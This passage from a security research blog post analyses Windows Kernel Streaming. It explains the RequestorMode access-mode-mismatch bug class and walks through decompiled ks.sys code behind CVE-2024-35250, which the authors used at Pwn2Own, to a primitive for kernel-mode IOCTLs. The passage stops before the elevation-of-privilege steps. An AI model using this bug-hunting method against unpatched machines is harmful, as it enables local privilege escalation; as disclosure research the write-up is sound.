  &lt;li&gt;Finally, you can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream&quot;&gt;IOCTL_KS_READ_STREAM&lt;/a&gt; to read data from this Pin.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;kernel-streaming-architecture&quot;&gt;Kernel Streaming architecture&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;For vulnerability research, we must first understand its architecture and consider the potential attack surfaces.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After gaining a preliminary understanding of the functionalities and operations of Kernel Streaming, we need to understand the architecture to find vulnerabilities. It‚Äôs crucial to know how Windows implements these functions and what components are involved. This way, we can identify which sys files to analyze and where to start.&lt;/p&gt;

&lt;p&gt;After our analysis, the overall architecture looks approximately like this diagram:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the Kernel Streaming components, the most important ones are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;. Almost all functionalities are related to them.&lt;/p&gt;

&lt;h3 id=&quot;ksthunk-kernel-streaming-wow-thunk-service-driver&quot;&gt;ksthunk (Kernel Streaming WOW Thunk Service Driver)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; is the entry point in Kernel Streaming. Its function is quite simple: it converts 32-bit requests from the WoW64 process into 64-bit requests, allowing the underlying driver to handle the requests without additional processing for 32-bit structures.&lt;/p&gt;

&lt;h3 id=&quot;ks-kernel-connection-and-streaming-architecture-library&quot;&gt;ks (Kernel Connection and Streaming Architecture Library)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; is one of the &lt;strong&gt;core components of Kernel Streaming&lt;/strong&gt;. It is the library of Kernel Streaming responsible for forwarding requests such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; to the corresponding device driver, and it also handles functions related to AVStream.&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_&quot;&gt;The work flow of IOCTL_KS_*&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; will be used as an example here. When calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt;, as shown in the figure below, the user‚Äôs request will be sequentially passed to the corresponding driver for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At step 6, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will determine which driver and handler to hand over your request based on the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; you requested.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, forward it to the corresponding driver, as shown in the figure above, where it is ultimately forwarded to the handler in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portcls&lt;/code&gt; to operate the audio device.&lt;/p&gt;

&lt;p&gt;You should now have a preliminary understanding of the architecture and process of Kernel Streaming. Next, it‚Äôs time to look for vulnerabilities.&lt;/p&gt;

&lt;p&gt;Based on the existing elements, which attack surfaces are worth examining?&lt;/p&gt;

&lt;h3 id=&quot;from-attackers-view&quot;&gt;From attacker‚Äôs view&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;„ÄÄBefore digging for vulnerabilities, if you can carefully consider under what circumstances they are likely to occur, you can achieve twice the result with half the effort.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;From a vulnerability researcher‚Äôs perspective, there are a few key points to consider:&lt;/p&gt;

&lt;h4 id=&quot;1-property-handler-in-each-device&quot;&gt;1. Property handler in each device&lt;/h4&gt;
&lt;p&gt;KS object for each device has its own properties, and each property has its own handler. Some properties are prone to issues during handling.&lt;/p&gt;

&lt;h4 id=&quot;2-ks-and-ksthunk&quot;&gt;2. ks and ksthunk&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; have not had vulnerabilities for a long time, but they are the most accessible entry points and might be good targets. The last vulnerabilities(&lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-16889&quot;&gt;CVE-2020-16889&lt;/a&gt; and &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17045&quot;&gt;CVE-2020-17045&lt;/a&gt;) were found in 2020 by &lt;a href=&quot;https://x.com/nghiadt1098&quot;&gt;@nghiadt1098&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;3-each-driver-handles-a-part-of-the-content&quot;&gt;3. Each driver handles a part of the content&lt;/h4&gt;
&lt;p&gt;In some functionalities of Kernel Streaming, certain drivers handle parts of the input individually, which may lead to inconsistencies.&lt;/p&gt;

&lt;p&gt;After reviewing Kernel Streaming from the above perspectives, we quickly identified several relatively easy-to-discover vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;portcls.sys
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38055 (out-of-bounds read when set dataformat for Pin)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38056&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ksthunk
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38054 (out-of-bounds write)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38057&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, we will not be explaining these vulnerabilities one by one. Most of these are obvious issues such as unchecked length or index leading to out-of-bounds access.  &lt;a href=&quot;https://x.com/Fr0st1706&quot;&gt;@Fr0st1706&lt;/a&gt; also wrote an &lt;a href=&quot;https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054&quot;&gt;exploit for CVE-2024-38054&lt;/a&gt; recently. We might slowly explain these in subsequent parts in the future. We will leave this for the readers to study for now.&lt;/p&gt;

&lt;p&gt;During the review process, we discovered some interesting things. Do you think the following code snippet is really fine?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(__int64 a1, struct _IRP *irp, __int64 a3, int *a4)
{

    if ( irp-&amp;gt;RequestorMode )
    {
        v14 = 0xC0000010;
    }
    else
    {
        UserBuffer = (unsigned int *)irp-&amp;gt;UserBuffer;
        ...
        v14 = (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64 *))    (Type3InputBuffer + 0x38))(// call Type3InputBuffer+0x38
                *UserBuffer,
                0LL,
               v19);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seeing this code reminds me of &lt;a href=&quot;https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/&quot;&gt;CVE-2024-21338&lt;/a&gt;. Initially, the vulnerability had no checks, but after patching, &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-exgetpreviousmode&quot;&gt;ExGetPreviousMode&lt;/a&gt; was added. However, the check here uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; in &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp&quot;&gt;IRP&lt;/a&gt; for validation. Generally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; from a user-called IOCTL will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt;, so there shouldn‚Äôt be any issues.&lt;/p&gt;

&lt;p&gt;At this point, I also recall &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt;‚Äôs article &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;the-overlooked-bug-class&quot;&gt;The overlooked bug class&lt;/h2&gt;
&lt;p&gt;First, we need to mention a few terms and concepts. If you are already familiar with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Previous Mode&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt;, you can skip to &lt;a href=&quot;#A-logical-bug-class&quot;&gt;A logical bug class&lt;/a&gt; section.&lt;/p&gt;

&lt;h3 id=&quot;previousmode&quot;&gt;PreviousMode&lt;/h3&gt;
&lt;p&gt;The first one is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;. In an Application, if a user operates on a device or file through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nt*&lt;/code&gt; System Service Call, upon entering the kernel, it will be marked as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt; in &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/kernel/eprocess#ethread&quot;&gt;_ETHREAD&lt;/a&gt;‚Äôs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;, indicating that this System Service Call is from the user. Conversely, if it is called from kernel mode, such as a device driver invoking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zw*&lt;/code&gt; System Service Call, it will be marked as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(2)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;requestormode&quot;&gt;RequestorMode&lt;/h3&gt;
&lt;p&gt;Another similar field is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; in the IRP. This field records whether your original request came from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;. In kernel driver code, this is a very commonly used field, typically derived from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;It is often used to decide whether to perform additional checks on user requests, such as Memory Access Check or Security Access Check. In the example below, if the request comes from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode&lt;/code&gt;, it will check the user-provided address. If it comes from the Kernel, no additional checks are performed to increase efficiency.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But in reality, this has also led to some issues.&lt;/p&gt;

&lt;h3 id=&quot;a-logical-bug-class&quot;&gt;A logical bug class&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt;‚Äôs &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; mentions a type of Bug Class.&lt;/p&gt;

&lt;p&gt;What would happen if a user calls a System Service Call like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtDeviceIoControlFile&lt;/code&gt;, and then the driver handling it uses user-controllable data as parameters for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZwOpenFile&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the driver calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZwOpenFile&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt; will switch to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;, and when it uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt; processing, most checks will be skipped due to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt; being &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;. Subsequently, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; will become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;,  bypassing the Security Access Check and Memory Access Check. However, this largely depends on how the subsequent driver implements these checks. There might be issues if it relies solely on¬†&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt;¬†to decide whether to perform checks The actual situation is slightly more complex and related to the flags of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFile&lt;/code&gt;. For details, refer to the following articles:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local privilege escalation via the Windows I/O Manager: a variant finding collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These studies mainly focused on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zw*&lt;/code&gt; series of System Service Call. Are there other similar situations that could also cause this kind of logical vulnerability?&lt;/p&gt;

&lt;h4 id=&quot;the-new-bug-pattern&quot;&gt;The new bug pattern&lt;/h4&gt;
&lt;p&gt;Actually, it is possible. When the device driver uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt; to create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt; IRP, it is easy to encounter such issues if not careful. This API is primarily used by kernel drivers to call IOCTL, and it helps you build the IRP. Subsequently, calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IofCallDriver&lt;/code&gt; allows you to call IOCTL within the kernel driver. On &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest#remarks&quot;&gt;Microsoft Learn&lt;/a&gt;, there is a particular passage worth noting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By default, if you do not explicitly set the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt;&lt;/strong&gt;, it will directly call IOCTL with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Following this approach, we revisited Kernel Streaming and discovered an intriguing aspect.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The function where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoBuildDeviceIoControlRequest&lt;/code&gt; is used in Kernel Streaming is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; and it obviously involves calling IOCTL in the kernel using the aforementioned method. However, it appears that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; is properly set here, and different values are assigned based on the parameters of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt;. This will be a convenient library for kernel streaming driver developers.&lt;/p&gt;

&lt;p&gt;However‚Ä¶&lt;/p&gt;

&lt;p&gt;ks!CKsPin::GetState
&lt;img src=&quot;/assets/img/blog/20240823/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!SerializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!UnserializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found that in Kernel Streaming, all functions using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; consistently use &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;&lt;/strong&gt;. At this point, we can carefully inspect whether the places it is used have any security issues. Therefore, we convert the bug pattern in Kernel Streaming into the following points:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Utilized &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Controllable InputBuffer &amp;amp; OutputBuffer&lt;/li&gt;
  &lt;li&gt;The second processing of IOCTL relies on &lt;strong&gt;RequestorMode&lt;/strong&gt; for security checks
 &lt;img src=&quot;/assets/img/blog/20240823/21.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Following this pattern, we quickly found the first vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;the-vulnerability--exploitation&quot;&gt;The vulnerability &amp;amp; exploitation&lt;/h2&gt;

&lt;h3 id=&quot;cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/h3&gt;

&lt;p&gt;This vulnerability is also the one we used in &lt;a href=&quot;https://x.com/thezdi/status/1770517322203070674&quot;&gt;Pwn2Own Vancouver 2024&lt;/a&gt;. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; of Kernel Streaming, to increase efficiency, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_SERIALIZESET&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; requests are provided to allow users to operate on multiple properties through a single call.  These types of requests will be broken down into multiple calls by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsPropertyHandler&lt;/code&gt;. For more details, refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure#remarks&quot;&gt;this one&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It is implemented in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When handling property in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;, if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; flag is provided, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!UnserializePropertySet&lt;/code&gt; will handle your request.&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnserializePropertySet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PIRP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSIDENTIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserProvideProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSPROPERTY_SET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;propertyset_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExAllocatePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NonPagedPoolNx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7070534Bu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[1] &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsSynchronousIoControlDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that during the processing, the original request is first copied into a newly allocated buffer at [1]. Subsequently, this buffer is used to call the new IOCTL using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; at [2]. Both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;New_KsProperty_req&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; are contents provided by the user.&lt;/p&gt;

&lt;p&gt;The flow when calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; is roughly as illustrated below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When calling IOCTL, as shown in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;step 2&lt;/code&gt; of the diagram, the I/O Manager will set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt;. Until step 6, it will check if the requested property by the user exists in the KS object. If the property exists in the KS object and is set with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt;,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; will be used to handle the specified property.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, in step 7, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; will be used to perform the IOCTL again. At this point, the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; will become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;, and the subsequent processing will be the same as a typical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt;. This part will not be elaborated further.&lt;/p&gt;

&lt;p&gt;As a result, we now have a primitive that allows us to perform arbitrary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; operations. Next, we need to look for places where it might be possible to achieve EoP (Elevation of Privilege).&lt;/p&gt;

&lt;h3 id=&quot;the-eop&quot;&gt;The EoP&lt;/h3&gt;
&lt;p&gt;The first thing you will likely notice is the entry point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSThunkDevice::DispatchIoctl&lt;/code&gt;.&lt;/p&gt;

